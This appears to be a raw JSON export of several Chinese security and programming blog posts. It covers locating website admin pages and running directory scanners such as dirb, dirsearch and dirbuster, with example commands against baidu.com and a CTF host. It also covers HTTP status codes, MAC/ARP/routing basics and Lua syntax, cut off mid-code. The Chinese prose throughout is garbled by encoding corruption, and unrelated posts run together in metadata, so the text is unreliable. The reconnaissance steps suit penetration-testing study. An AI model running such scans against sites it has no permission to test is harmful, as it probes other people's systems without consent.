ç½‘ç«™åˆ†ç›®å½•ä¸‹å¯»æ‰¾æœ‰çš„æ—¶å€™ç½‘ç«™ä¼šæŠŠç®¡ç†åœ°å€æ”¾åœ¨ä¸€ä¸ªåˆ†ç›®å½•ä¸‹ï¼Œæœ‰çš„æ—¶å€™ä¸€ä¸ªç½‘ç«™æ¯”è¾ƒå¤§ï¼Œåå°ç®¡ç†é¡µé¢ä¹Ÿæ¯”è¾ƒå¤šï¼Œå°±è¦åˆ†ç›®å½•çš„å»æ‰¾ï¼Œ ä¾‹å¦‚ï¼šhttp://www.xxx.com/test/admin/manage.php ä½ å¯ä»¥é€šè¿‡ä¸€äº›æ–¹å¼è·å–åˆ°ç½‘ç«™çš„ç›®å½•ï¼Œç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹è¿›è¡Œæ‰«æã€‚å½“ä¸€ä¸ªç½‘ç«™ä½ æ‰«ææ ¹ç›®å½•æ²¡æœ‰ä»»ä½•æ”¶è·æ—¶ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡åˆ†æç½‘ç«™çš„ç›®å½•ç»“æ„ï¼Œç„¶åæ‰«æåŸŸå+ç›®å½•ï¼Œå°±èƒ½æ‰¾å‡ºå®ƒçš„åå°ç®¡ç†åœ°å€ã€‚ å­åŸŸåä¸‹å¯»æ‰¾æœ‰çš„æ—¶å€™ç½‘ç«™çš„ç®¡ç†åœ°å€ä¼šæ”¾åœ¨å­åŸŸåä¸‹ï¼Œæ‰€ä»¥ä¸»ç«™ä»€ä¹ˆéƒ½æ‰¾ä¸åˆ°çš„æƒ…å†µä¸‹ï¼Œå¦‚æœå‘ç°å­åŸŸåï¼Œå°±é€šè¿‡è¿™äº›æ–¹æ³•å»å­åŸŸåä¸‹æ‰¾ä¸€ä¸‹å§ã€‚ ä¾‹å¦‚ï¼šhttp://admin.xxx.com/login Google HackingGoogle Hacking ä¸€èˆ¬æ˜¯åšä¸ºé»‘å®¢åœ¨å…¥ä¾µæ—¶çš„ä¸€ä¸ªæ‰‹æ®µã€‚åœ¨å…¥ä¾µè¿‡ç¨‹ä¸­æœ‰æ—¶éœ€è¦æŸ¥æ‰¾åå°çš„ç™»é™†å£å°±éœ€è¦ç”¨åˆ°Google Hackingã€‚æœ‰æ—¶çŒœè§£å¯†ç çš„æ—¶å€™è°·æ­Œä¹Ÿæ˜¯æä¾›æŸ¥æ‰¾ç®¡ç†å‘˜èµ„æ–™çš„æœ‰æ•ˆå¹³å°ã€‚æ˜¯ä¸€ç§ç¤¾ä¼šå·¥ç¨‹å­¦è·å–ç›®æ ‡ä¿¡æ¯çš„æ‰‹æ®µã€‚å¯ä»¥ç”¨äºè·Ÿè¸ªæŸå¯¹è±¡åœ¨ç½‘ç»œä¸Šçš„å„ç§è¸ªè¿¹ï¼ˆå¦‚äº¤å‹å¹³å°ã€å¾®åšç­‰ï¼‰ã€‚ Google hacking è¯­æ³•è‡ªè¡Œå­¦ä¹  ä¿¡æ¯æ”¶é›†ä¹‹Google Hackingçš„ç®€å•ç”¨æ³• uDorkï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„Google Hackingå·¥å…· ç½‘ç«™çˆ¬è™«é€šè¿‡awvsï¼Œburpsuiteçš„çˆ¬è¡ŒåŠŸèƒ½ï¼Œå¯ä»¥æ‹“æ‰‘å‡ºç½‘ç«™çš„ç›®å½•ç»“æ„ï¼Œæœ‰çš„æ—¶å€™è¿æ°”å¥½èƒ½åœ¨ç½‘é¡µçš„ç›®å½•ç»“æ„ä¸­æ‰¾åˆ°å¥½ä¸œè¥¿ï¼Œä¸è¿‡çˆ¬è¡Œä¸€èˆ¬ä¼šç»“åˆå·¥å…·æ‰«æï¼Œæ¯”å¦‚ä½ æ„é€ åŸŸå+ç›®å½•ï¼Œç„¶åæ‰«æè¿™ä¸ªã€‚ burp spiderçˆ¬è¡Œ æ‰«æå·¥å…· å¾¡å‰‘ ï¼šé’ˆå¯¹ç½‘ç«™ç›®å½•åŠåå°ç®¡ç†åœ°å€è¿›è¡Œæ‰«æçš„å·¥å…· dirbusterï¼šæ¢æµ‹WebæœåŠ¡å™¨ç›®å½•åŠéšè—æ–‡ä»¶ï¼Œæ“…é•¿æš´åŠ›çŒœè§£ wwwscanï¼šç½‘ç«™åå°æ‰«æå·¥å…· dirbï¼škaliå†…ç½®å·¥å…·ï¼ŒåŸºäºå­—å…¸çš„webç›®å½•æ‰«æå·¥å…·ï¼Œç”¨é€’å½’çš„æ–¹å¼æ¥è·å–æ›´å¤šçš„ç›®å½•ï¼Œæ”¯æŒä»£ç†å’Œhttpè®¤è¯é™åˆ¶è®¿é—®çš„ç½‘ç«™ 1dirb http://www.baidu.com dirmapï¼šé«˜çº§webç›®å½•æ‰«æå·¥å…·ã€‚é¡¹ç›®çš„åœ°å€ https://github.com/H4ckForJob/dirmap Cansinaï¼šç”¨pythonå†™çš„ä¸€æ¬¾æ¢æµ‹ç½‘ç«™çš„æ•æ„Ÿç›®å½•å’Œå†…å®¹çš„å®‰å…¨æµ‹è¯•å·¥å…·ã€‚é¡¹ç›®åœ°å€ https://github.com/deibit/cansina dirsearchï¼šæ‰«æç½‘ç«™çš„æ•æ„Ÿæ–‡ä»¶å’Œç›®å½•ä»è€Œæ‰¾åˆ°çªç ´å£ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/maurosoria/dirsearch/ weakfilescanï¼šåŸºäºçˆ¬è™«ï¼ŒåŠ¨æ€æ”¶é›†æ‰«æç›®æ ‡ç›¸å…³ä¿¡æ¯åè¿›è¡ŒäºŒæ¬¡æ•´ç†å½¢æˆå­—å…¸è§„åˆ™ï¼Œåˆ©ç”¨åŠ¨æ€è§„åˆ™çš„å¤šçº¿ç¨‹æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹å·¥å…· çŠ¶æ€ç çŠ¶æ€ç åˆ†ä¸ºäº”ç»„ 1xx ä¿¡æ¯å“åº”ã€‚ æ”¶åˆ°å¹¶ç†è§£çš„è¯·æ±‚ã€‚ è¯·æ±‚å¤„ç†å°†ç»§ç»­ã€‚ 2xx æˆåŠŸã€‚ å·²æˆåŠŸæ¥æ”¶ã€ç†è§£å’Œæ¥å—è¯¥æ“ä½œã€‚ 3xx é‡å®šå‘ã€‚ å®¢æˆ·ç«¯å¿…é¡»é‡‡å–è¿›ä¸€æ­¥æ“ä½œæ‰èƒ½å®Œæˆè¯·æ±‚ã€‚ 4xx å®¢æˆ·ç«¯é”™è¯¯ã€‚ å¯èƒ½æ˜¯å®¢æˆ·ç«¯å¯¼è‡´çš„é”™è¯¯ã€‚ è¯·æ±‚åŒ…å«é”™è¯¯çš„è¯­æ³•æˆ–æ— æ³•å®ç°ã€‚ 5xx æœåŠ¡å™¨é”™è¯¯ã€‚ æœåŠ¡å™¨é‡åˆ°é”™è¯¯ï¼Œæ— æ³•æ»¡è¶³è¯·æ±‚ã€‚ å¸¸è§çŠ¶æ€ç  çŠ¶æ€ä»£ç  200 è¿™æ˜¯æˆåŠŸ HTTP è¯·æ±‚çš„æ ‡å‡†â€ç¡®å®šâ€çŠ¶æ€ä»£ç ã€‚ çŠ¶æ€ä»£ç 301 èµ„æºï¼ˆç½‘é¡µç­‰ï¼‰è¢«æ°¸ä¹…è½¬ç§»åˆ°å…¶å®ƒURLã€æ°¸ä¹…é‡å®šå‘ã€‘ çŠ¶æ€ä»£ç 302 èµ„æºï¼ˆç½‘é¡µç­‰ï¼‰è¢«ä¸´æ—¶è½¬ç§»åˆ°å…¶å®ƒURLã€ä¸´æ—¶é‡å®šå‘ã€‘ çŠ¶æ€ä»£ç  400 æœåŠ¡å™¨ç”±äºå®¢æˆ·ç«¯é”™è¯¯è€Œæ— æ³•ç†è§£å’Œå¤„ç†è¯·æ±‚ã€‚ ã€å®¢æˆ·ç«¯å‘é€è¯·æ±‚è¯­æ³•é”™è¯¯ã€‘ çŠ¶æ€ä»£ç  401 å½“éœ€è¦èº«ä»½éªŒè¯ä½†å¤±è´¥æˆ–æœªæä¾›èº«ä»½éªŒè¯æ—¶ï¼Œå°†å‘ç”Ÿæ­¤çŠ¶æ€ä»£ç è¯·æ±‚ã€‚ çŠ¶æ€ä»£ç  403 ä¸çŠ¶æ€ä»£ç  401 éå¸¸ç›¸ä¼¼ï¼ŒçŠ¶æ€ä»£ç  403 åœ¨å‘é€æœ‰æ•ˆè¯·æ±‚æ—¶å‘ç”Ÿï¼Œä½†æœåŠ¡å™¨æ‹’ç»æ¥å—ã€‚ å¦‚æœå®¢æˆ·ç«¯&#x2F;ç”¨æˆ·éœ€è¦å¿…è¦çš„æƒé™ï¼Œæˆ–è€…ä»–ä»¬å¯èƒ½éœ€è¦å¸æˆ·æ¥è®¿é—®èµ„æºï¼Œåˆ™ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚ ä¸çŠ¶æ€ä»£ç  401 ä¸åŒï¼Œèº«ä»½éªŒè¯å°†ä¸é€‚ç”¨äºæ­¤å¤„ã€‚ çŠ¶æ€ä»£ç  404 æ™®é€šç”¨æˆ·å°†çœ‹åˆ°çš„æœ€å¸¸è§çŠ¶æ€ä»£ç ã€‚ å½“è¯·æ±‚æœ‰æ•ˆï¼Œä½†æ— æ³•åœ¨æœåŠ¡å™¨ä¸Šæ‰¾åˆ°èµ„æºæ—¶ï¼Œå°†å‘ç”ŸçŠ¶æ€ä»£ç  404ã€‚ çŠ¶æ€ä»£ç  500 æ˜¯çœŸæ­£çš„é”™è¯¯ä»£ç ã€‚ å½“æœåŠ¡å™¨ç”±äºæ„å¤–é—®é¢˜æ— æ³•å®Œæˆè¯·æ±‚æ—¶ï¼Œå°†å‘ç”ŸçŠ¶æ€ä»£ç  500ã€‚ã€æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‘ çŠ¶æ€ä»£ç  502 ç½‘å…³é”™è¯¯ã€‚æœåŠ¡å™¨ä½œä¸ºç½‘å…³å¹¶ä¸”ä»ä¸Šæ¸¸æœåŠ¡å™¨è·å–åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„httpå“åº” å‚è€ƒæ–‡ç« https://cloud.tencent.com/developer/article/1925598","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"ç›®å½•æ‰«æ","slug":"ç›®å½•æ‰«æ","permalink":"https://gryffinbit.top/tags/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"}],"author":"Gryffinbit"},{"title":"ç›®å½•æ‰«æï¼šdirsearchã€dirbusterç”¨æ³•","slug":"ç›®å½•æ‰«æï¼šdirsearchã€dirbusterç”¨æ³•","date":"2022-08-24T10:33:22.000Z","updated":"2024-11-12T07:00:08.000Z","comments":true,"path":"2022/08/24/ç›®å½•æ‰«æï¼šdirsearchã€dirbusterç”¨æ³•/","permalink":"https://gryffinbit.top/2022/08/24/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9Adirsearch%E3%80%81dirbuster%E7%94%A8%E6%B3%95/","excerpt":"","text":"dirsearchç¯å¢ƒé…ç½® é¡¹ç›®åœ°å€ï¼šhttps://github.com/maurosoria/dirsearch Kali Linux 2021.3 ARM64 kaliå®‰è£…1sudo apt-get install dirsearch dirsearch è·¯å¾„ 1/usr/lib/python3/dist-packages/dirsearch è¾“å‡ºæ—¥å¿— 1-o output.txt æ—¥å¿—è·¯å¾„ï¼š/usr/lib/python3/dist-packages/dirsearch 1dirsearch -u http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81 -t 120 -o /root/report.txt å°†ä¼šåœ¨rootç›®å½•ä¸‹å‡ºç°report.txt å¤šçº¿ç¨‹ 1-t 20 å‚æ•°è‡ªè¡ŒæŸ¥è¯¢ 1dirsearch -h å¸¸ç”¨å‚æ•° 123-u æŒ‡å®šéœ€è¦æ‰«æçš„URL-e æŒ‡å®šéœ€è¦æ‰«æçš„æ‰©å±•åï¼ˆæ–‡ä»¶ç±»å‹ï¼‰ï¼Œæ¯”å¦‚php,jspç­‰ï¼Œå¦‚æœä¸çŸ¥é“å¯ä»¥ç”¨*ï¼Œå¤šä¸ªæ‰©å±•åç”¨é€—å·éš”å¼€-X æ’é™¤ç”¨é€—å·åˆ†éš”çš„æ‰©å±•ååˆ—è¡¨ï¼ˆæ¯”å¦‚asp,jsp) å¸¸è§„è®¾ç½® 1234567891011121314151617181920212223242526272829303132333435363738394041424344-d DATA, --data=DATA HTTPè¯·æ±‚æ•°æ®-r, --recursive é€’å½’çˆ†ç ´ç›®å½•-R RECURSIVE_LEVEL_MAX, --recursive-level-max=RECURSIVE_LEVEL_MAX æœ€å¤§é€’å½’çº§åˆ«ï¼ˆå­ç›®å½•ï¼‰ï¼ˆé»˜è®¤å€¼ï¼š0[æ— é™]ï¼‰ --suppress-empty ç¦æ­¢ç©ºå“åº” --minimal=MINIMUMRESPONSESIZE å“åº”æ—¶é—´æœ€çŸ­ --maximal=MAXIMUMRESPONSESIZE æœ€å¤§å“åº”é•¿åº¦ --scan-subdirs=SCANSUBDIRS æ‰«æç»™å®šURLçš„å­ç›®å½•ï¼ˆä»¥é€—å·åˆ†éš”ï¼‰ --exclude-subdirs=EXCLUDESUBDIRS é€’å½’æ‰«ææœŸé—´æ’é™¤ä»¥ä¸‹å­ç›®å½•ï¼ˆä»¥é€—å·åˆ†éš”ï¼‰-t THREADSCOUNT, --threads=THREADSCOUNT çº¿ç¨‹æ•°-i INCLUDESTATUSCODES, --include-status=INCLUDESTATUSCODES ä»…æ˜¾ç¤ºåŒ…å«çš„çŠ¶æ€ç ï¼Œä»¥é€—å·åˆ†éš” ï¼ˆä¾‹å¦‚ï¼š301ã€500ï¼‰-x EXCLUDESTATUSCODES, --exclude-status=EXCLUDESTATUSCODES ä¸æ˜¾ç¤ºæ’é™¤çš„çŠ¶æ€ä»£ç ï¼Œä»¥é€—å·åˆ†éš”ï¼ˆä¾‹å¦‚ï¼š301ã€500ï¼‰-H HEADERS, --header=HEADERS HTTP request header, support multiple flags (Example: -H &quot;Referer: example.com&quot; -H &quot;Accept: */*&quot;) HTTPè¯·æ±‚æ ‡å¤´ï¼Œæ”¯æŒå¤šä¸ªæ ‡å¿—ï¼ˆä¾‹å¦‚ï¼š-Hâ€œå¼•ç”¨è€…ï¼šexample.comâ€ -Hâ€œæ¥å—ï¼š* / *â€ï¼‰ dirbusterç¯å¢ƒé…ç½®Kali Linux 2021.3 ARM64 æ“ä½œè½¯ä»¶ kaliè‡ªå¸¦ï¼Œæœç´¢å°±å¯ä»¥æ‰¾åˆ° å‚æ•°å¡«å†™ ç›®æ ‡åœ°å€å¡«å†™ çº¿ç¨‹æ•°é‡é€‰æ‹©ï¼Œç”µè„‘é…ç½®é«˜çš„å¯ä»¥é…å¤šä¸€äº› å­—å…¸é€‰æ‹©ã€‚å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„å­—å…¸ï¼Œå­—å…¸è·¯å¾„ã€‚/usr/share/wordlists/dirbuster çˆ†å‡ºçš„ç›®å½•ç»“æœæŸ¥çœ‹","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·","slug":"æ¸—é€æµ‹è¯•/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[],"author":"Gryffinbit"},{"title":"MACè¡¨ã€APRè¡¨ã€è·¯ç”±è¡¨ã€ç»„æ’­ã€å¹¿æ’­å¼‚åŒ","slug":"MACè¡¨ã€APRè¡¨ã€è·¯ç”±è¡¨ã€ç»„æ’­ã€å¹¿æ’­å¼‚åŒ","date":"2022-08-23T16:00:22.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/08/24/MACè¡¨ã€APRè¡¨ã€è·¯ç”±è¡¨ã€ç»„æ’­ã€å¹¿æ’­å¼‚åŒ/","permalink":"https://gryffinbit.top/2022/08/24/MAC%E8%A1%A8%E3%80%81APR%E8%A1%A8%E3%80%81%E8%B7%AF%E7%94%B1%E8%A1%A8%E3%80%81%E7%BB%84%E6%92%AD%E3%80%81%E5%B9%BF%E6%92%AD%E5%BC%82%E5%90%8C/","excerpt":"","text":"MAC äº¤æ¢æœºæ ¹æ®MACå¯»å€ï¼ŒæŸ¥è¡¨ç¡®è®¤ç«¯å£ MACåœ°å€ï¼šæ•°æ®é“¾è·¯å±‚ã€‚ä»¥å¤ªç½‘åœ°å€ã€ç‰©ç†åœ°å€ï¼Œç”¨äºç¡®è®¤ç½‘ç»œè®¾å¤‡ä½ç½®çš„åœ°å€ã€‚ MACè¡¨ï¼šåˆç§°è½¬å‘è¡¨ã€‚äº¤æ¢æœºæ ¹æ®è½¬å‘è¡¨æ¥è½¬å‘æ•°æ®å¸§ã€‚ äº¤æ¢æœºæœ‰å­˜å‚¨è½¬å‘åŠŸèƒ½ï¼šæ¥æ”¶åˆ°æ•°æ®å¸§åï¼Œè®°å½•æ•°æ®å¸§ä¸­çš„æºMACåœ°å€å’Œå¯¹åº”çš„åˆ°è¾¾ç«¯å£ã€‚ å•æ’­å’Œå¹¿æ’­ï¼š å•æ’­ï¼šäº¤æ¢æœºæ£€æŸ¥è‡ªå·±çš„MACè¡¨æ˜¯å¦æœ‰æ•°æ®å¸§ä¸­ç›®çš„MACåœ°å€çš„åŒ¹é…æ¡ç›®ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ä¼šæ ¹æ®MACè¡¨ä¸­è®°å½•çš„å¯¹åº”ç«¯å£å°†æ•°æ®å¸§è½¬å‘å‡ºå» å¹¿æ’­ï¼šå¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šå°†æ•°æ®å¸§ä»éè¾¾åˆ°ç«¯å£çš„å…¶ä»–å…¨éƒ¨ç«¯å£å‘é€å‡ºå»ã€‚ ARP ARPï¼šåœ°å€è§£æåè®®ï¼Œç½‘ç»œå±‚ã€‚ä»¥å¤ªç½‘ç¯å¢ƒä¸‹ï¼ŒåŒä¸€ä¸ªç½‘æ®µçš„ä¸»æœºä¹‹é—´éœ€è¦çŸ¥é“å¯¹æ–¹çš„MACåœ°å€ï¼Œæ‰èƒ½é€šä¿¡ã€‚ ARPè¡¨ï¼šè®°å½•ç€ä¸»æœºçš„IPåœ°å€åˆ°MACåœ°å€çš„æ˜ å°„å…³ç³» è·¯ç”± è·¯ç”±å™¨è´Ÿè´£ä¸åŒç½‘æ®µä¹‹é—´çš„é€šä¿¡ï¼Œæ¯ä¸ªä¸è·¯ç”±å™¨ç«¯å£ç›¸è¿çš„ç½‘ç»œè¢«ç§°ä¸ºä¸€ä¸ªå­ç½‘æˆ–ç½‘æ®µï¼Œä¹Ÿå³æ˜¯ä¸€ä¸ªå¹¿æ’­åŸŸã€‚ è·¯ç”±è¡¨ï¼šè·¯ç”±å™¨ä¸­çš„è¡¨ï¼Œé€šè¿‡åœ¨ç½‘ç»œèŠ‚ç‚¹ä¸Šè¿è¡Œè·¯ç”±åè®®ï¼Œè®°å½•å¹¶æ›´æ–°å»å¾€ä¸åŒç½‘æ®µçš„è·¯å¾„ä¿¡æ¯ã€‚ è·¯ç”±è¡¨åŒ…æ‹¬ï¼šç›®çš„ç½‘ç»œã€ç½‘å…³åœ°å€ã€ç½‘ç»œæ©ç ï¼ˆç”¨äºåˆ¤æ–­ä»»æ„ä¸¤å°ä¸»æœºæ˜¯å¦å¤„äºåŒä¸€ä¸ªç½‘æ®µçš„æ ¹æ®ã€‚ä¸¤å°ä¸»æœºå„è‡ªçš„IPåœ°å€ä¸æœ¬æœºé…ç½®çš„å­ç½‘æ©ç åšæŒ‰ä½ä¸æ“ä½œï¼Œå¦‚æœç»“æœç›¸åŒï¼Œåˆ™å¤„äºåŒä¸€ç½‘æ®µï¼Œæ— éœ€è·¯ç”±è½¬å‘ï¼‰ å•æ’­å•æ’­é€šè®¯ä½äºç½‘ç»œå±‚ã€‚åŸºäºç›®çš„è®¾å¤‡çš„IPåœ°å€è¿›è¡Œè½¬å‘ã€‚ å‘é€æ–¹æŠŠå»å¾€é™¤æœ¬åœ°å­ç½‘ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–ç½‘ç»œçš„IPæµé‡ï¼Œéƒ½å‘ç»™ç½‘å…³&#x2F;è·¯ç”±å™¨ -&gt; è·¯ç”±å™¨ä¼šæŸ¥çœ‹æ•°æ®åŒ…çš„ç›®çš„IPåœ°å€ -&gt; è·¯ç”±å™¨æ ¹æ®è·¯ç”±è¡¨ä¸­çš„ä¿¡æ¯ï¼Œå°†æ•°æ®åŒ…è½¬å‘ç»™ä¸‹ä¸€è·³è·¯ç”±å™¨ -&gt; æœ€ç»ˆç›®çš„è·¯ç”±å™¨æ”¶åˆ°æ•°æ®åŒ…åï¼Œä¼šæŠŠå®ƒè½¬å‘ç»™æ¥æ”¶æ–¹ å‘é€æ–¹ä»æ¥ä¸ä¼šå­¦åˆ°æ¥æ”¶æ–¹çš„MACåœ°å€ï¼Œå› ä¸ºæ¥æ”¶æ–¹Aä¸å‘é€æ–¹ä¸å¤„äºåŒä¸€ä¸ªå­ç½‘ å¹¿æ’­å°†ä¸€ä¸ªæ¶ˆæ¯å‘é€ç»™ä¸€ä¸ªå­ç½‘æˆ–äºŒå±‚åŸŸä¸­çš„æ‰€æœ‰è®¾å¤‡ï¼Œæ¯å°è®¾å¤‡éƒ½æœ‰ä¹‰åŠ¡æŸ¥çœ‹è¿™ä¸ªæ¶ˆæ¯ï¼Œä»¥æ­¤æ¥ç¡®å®šè¿™ä¸ªæ¶ˆæ¯æ˜¯å¦æ˜¯å‘é€ç»™è‡ªå·±çš„ã€‚ å¦‚æœè®¾å¤‡å¸Œæœ›ä¸æŸä¸ªIPä¸»æœºè¿›è¡Œé€šä¿¡ï¼Œä½†å´ä¸çŸ¥é“è¿™ä¸ªIPä¸»æœºçš„ç›®çš„MACåœ°å€ï¼Œå®ƒå°±ä¼šå°†IPå•æ’­æ¶ˆæ¯å°è£…åœ¨è¡¨ç¤ºå…¨éƒ¨ä¸»æœºçš„ä»¥å¤ªç½‘å¹¿æ’­æ•°æ®å¸§ä¸­ï¼Œå¹¶å‘é€å‡ºå»ï¼ŒåŒä¸€ä¸ªä»¥å¤ªç½‘æ®µä¸­çš„æ‰€æœ‰è®¾å¤‡éƒ½ä¼šæ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…ã€‚ ç»„æ’­ ç»„æ’­æ˜¯æ›´é«˜æ•ˆçš„å¹¿æ’­ã€‚å®ƒä¸å¹¿æ’­çš„åŒºåˆ«åœ¨äºï¼Œç»„æ’­æ•°æ®æµçš„æ½œåœ¨æ¥æ”¶æ–¹å¯ä»¥ä½äºä¸åŒçš„ç½‘æ®µä¸­ã€‚ç½‘ç»œè®¾å¤‡åœ¨æ¥æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…åå°†å…¶å¤åˆ¶ï¼Œç„¶åæŠŠå¤åˆ¶æ•°æ®åŒ…ä»æ›´å¤šä¸ªç½‘ç»œæ¥å£å‘é€å‡ºå»ã€‚ è·¯ç”±å™¨å’Œäº¤æ¢æœºå¿…é¡»å¤åˆ¶ä»æºæ¥å£æ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œç„¶åæŠŠå®ƒè½¬å‘ç»™å¤šä¸ªæ¥æ”¶æ–¹ ç½‘ç»œè®¾å¤‡ä¼šæ ¹æ®äºŒå±‚æˆ–ä¸‰å±‚åŸŸä¸­çš„å¤šä¸ªæ¥æ”¶æ–¹ï¼Œæœ‰é€‰æ‹©æ€§çš„å­¦ä¹ æ•°æ®æµ ä¼˜åŒ–äº†å¸¦å®½åˆ©ç”¨ç‡","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"luaè¯­æ³•","slug":"luaè¯­æ³•","date":"2022-08-22T15:20:16.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/08/22/luaè¯­æ³•/","permalink":"https://gryffinbit.top/2022/08/22/lua%E8%AF%AD%E6%B3%95/","excerpt":"","text":"luaç®€ä»‹ Luaæ˜¯ä¸€ä¸ªå¯æ‰©å±•çš„åµŒå…¥å‹è„šæœ¬è¯­è¨€ åµŒå…¥å¼è¯­è¨€ï¼šåŸºäºANSI Cå®ç°ï¼ŒåŸºæœ¬ä¸Šæ¯ç§ç¼–ç¨‹è¯­è¨€éƒ½æœ‰è°ƒç”¨Cå‡½æ•°çš„æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥åœ¨æ‰€æœ‰è¿™äº›è¯­è¨€ä¸­ä½¿ç”¨Luaã€‚åŒ…æ‹¬C++ã€Goã€Rustã€Python è§£é‡Šå‹è¯­è¨€ï¼šLuaä¼šå…ˆç¼–è¯‘æˆå­—èŠ‚ç ï¼Œç„¶ååœ¨Luaè™šæ‹Ÿæœºä¸Šè§£é‡Šæ‰§è¡Œè¿™äº›å­—èŠ‚ç ã€‚ä¿è¯äº†å¯ç§»æ¤æ€§ åŠ¨æ€ç±»å‹è¯­è¨€ï¼šLuaæœ¬èº«æ²¡æœ‰å®šä¹‰ç±»å‹ï¼Œä¸è¿‡è¯­è¨€ä¸­çš„æ¯ä¸ªå€¼éƒ½åŒ…å«ç€ç±»å‹ä¿¡æ¯ è¯­æ³•è§„èŒƒç¼–ç é£æ ¼ æ ‡è¯†ç¬¦ï¼ˆæˆ–åç§°ï¼‰ï¼šæ˜¯ç”±ä»»æ„å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼ˆä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼‰ ä¸‹åˆ’çº¿+å¤§å†™å­—æ¯ï¼šé€šå¸¸è¢«ç”¨ä½œç‰¹æ®Šç”¨é€”ã€‚å¦‚ï¼š_Version å¤§å°å†™æ•æ„Ÿã€‚å¦‚Andå’ŒANDæ˜¯ä¸¤ä¸ªä¸åŒçš„æ ‡è¯†ç¬¦ æ³¨é‡Š å•è¡Œæ³¨é‡Šï¼š 1-- æ³¨é‡Šå†…å®¹ å¤šè¡Œæ³¨é‡Šï¼š 12345678910--[[æ³¨é‡Šå†…å®¹]]--[[æ³¨é‡Šå†…å®¹--]]--[[æ³¨é‡Šå†…å®¹]] å–æ¶ˆæ³¨é‡Šï¼š 123---[[æ³¨é‡Šå†…å®¹]] å˜é‡ï¼š å˜é‡é»˜è®¤æ˜¯å…¨å±€å˜é‡ï¼Œå³ç›´æ¥å†™å˜é‡åå³ä¸ºå…¨å±€å˜é‡ï¼Œå±€éƒ¨å˜é‡çš„å®šä¹‰éœ€è¦åŠ localå…³é”®å­—ä¿®é¥° å…¨å±€å˜é‡ï¼šg_var å±€éƒ¨å˜é‡ï¼šloc_var LuaåŸºæœ¬ç±»å‹nilç©ºï¼Œå˜é‡å®šä¹‰å‡ºæ¥åœ¨ç¬¬ä¸€æ¬¡èµ‹å€¼ä¹‹å‰æ˜¯ç©ºçš„ï¼Œç›®çš„ç”¨äºå‘Šè¯‰luaå®ƒæ˜¯æ²¡æœ‰åˆå§‹åŒ–çš„ã€‚nilåœ¨luaé‡Œé¢åªæœ‰èµ‹å€¼æ“ä½œ=ï¼Œå’Œåˆ¤æ–­æ“ä½œ==ã€ï½=æ‰æœ‰æ•ˆã€‚å…¶ä»–æ“ä½œç¬¦éƒ½ä¼šæŠ¥é”™ numberLua5.3ä¹‹å‰ï¼šæ‰€æœ‰æ•°å€¼éƒ½æ˜¯åŒç²¾åº¦æµ®ç‚¹æ ¼å¼ Lua5.3ä¹‹åï¼šint 64ä½æ•´å‹ã€doubleåŒç²¾åº¦æµ®ç‚¹ã€‚ ç²¾ç®€Luaæ¨¡å¼ï¼šint 32ä½æ•´å‹ã€floatå•ç²¾åº¦æµ®ç‚¹ stringLuaä¸­çš„å­—ç¬¦ä¸²å¯ä»¥å­˜å‚¨åŒ…æ‹¬ç©ºå­—ç¬¦åœ¨å†…çš„æ‰€æœ‰æ•°å€¼ä»£ç ã€‚æ‰€ä»¥å¯ä»¥åœ¨å­—ç¬¦ä¸²ä¸­å­˜å‚¨ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®ã€‚ å¯ä»¥ä½¿ç”¨ç¼–ç æ–¹å¼ï¼ˆUTF-8ï¼‰æ¥å­˜å‚¨unicodeå­—ç¬¦ä¸² è·å–é•¿åº¦ #å­—ç¬¦ä¸² ï¼š å¯ä»¥ç›´æ¥è·å– string.len(å­—ç¬¦ä¸²) ï¼š è¦å…ˆæŸ¥æ‰¾string(table) å†æ‰¾å…¶ä¸‹çš„lenï¼Œä¼ å‚è°ƒç”¨ 123456789101112local a = &quot;aaa&quot;local a_len = utf8.len(a) local b = &quot;ä½ å¥½&quot;local b_len1 = utf8.len(b)local b_len2 = #blocal b_len3 = string.len(b) print(&quot;a_len:&quot; .. a_len .. &quot;, b_len1:&quot; .. b_len1 .. &quot;, 